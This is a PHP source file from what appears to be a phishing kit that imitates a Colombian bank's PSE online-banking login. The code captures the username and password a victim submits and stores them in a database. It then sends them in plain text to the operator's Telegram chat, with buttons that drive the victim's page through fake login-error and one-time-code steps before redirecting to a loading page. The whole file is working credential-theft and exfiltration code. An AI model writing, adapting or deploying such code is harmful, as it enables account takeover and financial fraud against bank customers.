<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
include '../../../db.php';
$config = include '../../../config.php';

function escapeMarkdownV2($text) {
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '\`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $banco = ucfirst('bogota');
    
    // Hardcoded fix for banco names if necessary
    if ($banco === 'Caja_social') $banco = 'Caja Social';
    
    if (empty($user) || empty($pass)) {
        die("Error: Todos los campos son obligatorios.");
    }

    $clienteId = $_SESSION['cliente_id'] ?? null;
    $nuevo_id = $clienteId;

    if ($clienteId) {
        $sql = "UPDATE pse SET estado = :estado, usuario = :usuario, clave = :clave, banco = :banco WHERE id = :id";
        $stmt = $conn->prepare($sql);
        $stmt->execute(['estado' => 1, 'usuario' => $user, 'clave' => $pass, 'banco' => $banco, 'id' => $clienteId]);
    } else {
        $sql_insert = "INSERT INTO pse (usuario, clave, banco, estado) VALUES (:usuario, :clave, :banco, :estado) RETURNING id";
    $stmt_insert = $conn->prepare($sql_insert);
    $estado = 1;
    $stmt_insert->execute(['usuario' => $user, 'clave' => $pass, 'banco' => $banco, 'estado' => $estado]);
    $nuevo_id = $stmt_insert->fetchColumn();
    } 

    $botToken = $config['botToken'];
    $chatId = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    $emLock = json_decode('"\ud83d\udd12"');
    $emUser = json_decode('"\ud83d\udc64"');
    $emKey  = json_decode('"\ud83d\udd11"');
    $emBank = json_decode('"\ud83c\udfe6"');
    $emId   = json_decode('"\ud83c\udd94"');

    $message = "{$emLock} *Nuevo inicio de sesión*\n\n"
        . "{$emId} *ID Cliente:* `" . escapeMarkdownV2($nuevo_id) . "`\n"
        . "{$emUser} *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
        . "{$emKey} *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
        . "{$emBank} *Banco:* `" . escapeMarkdownV2($banco) . "`";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
            ],
            [
                ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2',
        'reply_markup' => json_encode($keyboard)
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'ignore_errors' => true 
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Some banks had cargando.php one level up, some same level. This points standard.
    header("Location: ../cargando.php?id=" . $nuevo_id);
    exit();
}
?>